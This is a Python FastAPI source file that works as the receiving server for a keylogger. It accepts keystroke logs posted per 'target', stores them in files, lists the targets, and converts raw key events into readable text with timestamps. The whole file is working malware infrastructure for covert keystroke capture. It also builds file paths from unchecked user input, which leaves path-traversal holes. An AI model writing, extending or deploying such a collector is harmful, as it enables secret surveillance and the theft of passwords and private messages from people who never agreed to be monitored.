from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import os

app = FastAPI()

# Configuration
SAVE_DIR = "Logs"  # Directory to store logs
MAX_SIZE = 10 * 1024 * 1024  # 10MB per log file

# Ensure the Logs directory exists
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

# Pydantic model to handle incoming log data
class LogData(BaseModel):
    logs: str
    user_name: str  # User name (or target name)

# Utility function to parse raw key logs
from datetime import datetime

from datetime import datetime, timedelta

def parse_logs(raw_logs: str) -> str:
    key_mapping = {
        "Key.space": " ",
        "Key.enter": "\n",  # Newline for enter
        "Key.tab": "[TAB]",
        "Key.backspace": "[BACKSPACE]",
        "Key.ctrl_l": "[CTRL]",
        "Key.shift": "[SHIFT]",
        "Key.alt_l": "[ALT]",
        "Key.right": "[RIGHT]",
        "Key.left": "[LEFT]",
        "Key.caps_lock": "[CAPS LOCK]",
        "Key.page_up": "[PAGE UP]",
        "Key.page_down": "[PAGE DOWN]",
        "Key.esc": "[ESC]",
        "Key.up": "[UP ARROW]",
        "Key.down": "[DOWN ARROW]",
        "Key.left": "[LEFT ARROW]",
        "Key.right": "[RIGHT ARROW]",
        "Key.delete": "[DELETE]",
        "Key.insert": "[INSERT]",
        "Key.end": "[END]",
        "Key.home": "[HOME]",
        "Key.f1": "[F1]",
        "Key.f2": "[F2]",
        "Key.f3": "[F3]",
        "Key.f4": "[F4]",
        "Key.f5": "[F5]",
        "Key.f6": "[F6]",
        "Key.f7": "[F7]",
        "Key.f8": "[F8]",
        "Key.f9": "[F9]",
        "Key.f10": "[F10]",
        "Key.f11": "[F11]",
        "Key.f12": "[F12]",
    }

    readable_logs = []
    last_timestamp = datetime.now()
    key_count = 0

    # Split the raw logs into lines
    for log in raw_logs.splitlines():
        # Map each log to a readable key
        if log in key_mapping:
            readable_logs.append(key_mapping[log])
        else:
            readable_logs.append(log.strip("'"))  # Clean up the quotes

        key_count += 1

        # Check if it's time for a timestamp
        time_diff = datetime.now() - last_timestamp
        if time_diff >= timedelta(minutes=1):  # Add timestamp every minute
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            readable_logs.append(f"[{timestamp}]")  # Add timestamp at the beginning

            # Update the last timestamp to the current time
            last_timestamp = datetime.now()

        # Add timestamp if the ENTER key is pressed
        if "[ENTER]" in readable_logs[-1]:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            readable_logs.insert(-1, f"[{timestamp}]")  # Add timestamp before the Enter key

    # Join the logs into a single string for output
    return "".join(readable_logs)

@app.get("/targets")
async def get_targets():
    """Returns a list of all available target log files."""
    try:
        targets = [f.split(".")[0] for f in os.listdir(SAVE_DIR) if f.endswith(".txt")]
        return {"targets": targets}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error retrieving targets: {str(e)}")

@app.get("/logs/{target_name}")
async def get_logs(target_name: str):
    """Returns the parsed logs for a specific target."""
    user_file = os.path.join(SAVE_DIR, f"{target_name}.txt")
    if not os.path.exists(user_file):
        raise HTTPException(status_code=404, detail="Log file not found")

    try:
        with open(user_file, "r") as f:
            raw_logs = f.read()
        parsed_logs = parse_logs(raw_logs)
        return {"target_name": target_name, "logs": parsed_logs}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error reading log file: {str(e)}")

@app.post("/logs")
async def post_logs(log_data: LogData):
    """Receives logs and stores them in the respective log file."""
    try:
        # Create a log file based on the user_name if it doesn't exist
        user_file = os.path.join(SAVE_DIR, f"{log_data.user_name}.txt")

        # Append the new logs to the file
        with open(user_file, "a") as f:
            f.write(log_data.logs + "\n")

        return {"message": "Logs received and saved successfully."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error saving logs: {str(e)}")

@app.get("/")
async def main():
    """Serves the HTML page."""
    try:
        with open("index.html", "r") as f:
            return HTMLResponse(f.read())
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="index.html not found")
